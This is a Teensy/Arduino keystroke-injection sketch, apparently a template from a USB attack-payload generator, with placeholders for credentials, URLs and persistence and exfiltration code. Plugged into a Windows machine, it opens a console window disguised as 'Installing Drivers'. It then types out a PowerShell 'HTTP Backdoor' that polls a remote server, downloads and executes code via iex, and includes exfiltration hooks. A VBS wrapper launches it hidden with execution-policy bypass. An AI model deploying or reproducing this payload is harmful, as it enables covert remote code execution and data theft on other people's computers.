#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  HTTP Backdoor\" > %temp%\\hb.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\hb.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\hb.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\hb.ps1");
  String fn = "hb";
  
  PERSCALLS
  
  Keyboard.println("echo while(1){ $exec = 0 >> %temp%\\hb.ps1");
  Keyboard.println("echo sleep 5 >> %temp%\\hb.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\hb.ps1");
  Keyboard.println("echo $fc = $wc.DownloadString(\"INPUT4\") >> %temp%\\hb.ps1");
  Keyboard.println("echo if($fc -eq \"INPUT5\"){ >> %temp%\\hb.ps1");
  Keyboard.println("echo $pv = iex $wc.DownloadString(\"INPUT6\") >> %temp%\\hb.ps1");
  Keyboard.println("echo $exec++  >> %temp%\\hb.ps1");
  Keyboard.println("echo if ($exec -eq 1){ >> %temp%\\hb.ps1");

  EXFILCALLS

  Keyboard.println("echo sleep 60 }}  >> %temp%\\hb.ps1");
  Keyboard.println("echo if ($fc -eq \"INPUT7\"){ break }} >> %temp%\\hb.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\hb.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\hb.ps1\"),0,true >> %temp%\\hb.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\hb.vbs");
  delay(1000);
  Keyboard.println("exit");
}

void loop(){
}

 DEFS
 PERSDEFS
 EXFILDEFS